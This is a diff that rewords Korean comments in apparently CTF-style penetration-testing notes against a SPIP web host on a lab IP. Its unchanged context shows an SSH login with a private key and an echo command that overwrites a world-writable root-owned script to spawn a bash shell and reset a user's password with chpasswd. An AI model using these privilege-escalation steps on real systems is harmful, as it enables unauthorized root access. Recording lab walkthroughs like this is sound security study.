@@ -292,7 +292,7 @@ IndentationError: expected an indented block after 'try' statement on line 64
 ──(root㉿docker-desktop)-[/]
 └─# http http://10.201.17.89
 
-# 탐색 -> 안 나옴
+# 탐색 -> 나오지 않음
 
 ┌──(root㉿docker-desktop)-[/]
 └─# http http://10.201.17.89/spip.php
@@ -2630,13 +2630,13 @@ think@ip-10-201-11-134:/dev/shm$ ls -l /opt/run_container.sh
 -rwxrwxrwx 1 root root 1715 Jan 10 2024 /opt/run_container.sh
 think@ip-10-201-11-134:/dev/shm$
 
-# 상위 opt 디렉토리에는 쓰기 권한이 없으므로 안 됨
+# 상위 opt 디렉토리에는 쓰기 권한이 없으므로 되지 않음
 
 drwxr-xr-x 3 root root 4096 Jan 10 2024 opt
 
 ssh -i id_rsa think@10.201.17.89
 
-# tee 은 바로 가능하므로 진행 -> 덮어쓰기 -> 안 됨 -> 보안 서비스가 작동중인 것으로 의심
+# tee 은 바로 가능하므로 진행 -> 덮어쓰기 -> 되지 않음 -> 보안 서비스가 작동중인 것으로 의심
 
 echo 'get_root_shell(){ /bin/bash; echo "think:1234" | chpasswd; }; get_root_shell' > /opt/run_container.sh
 
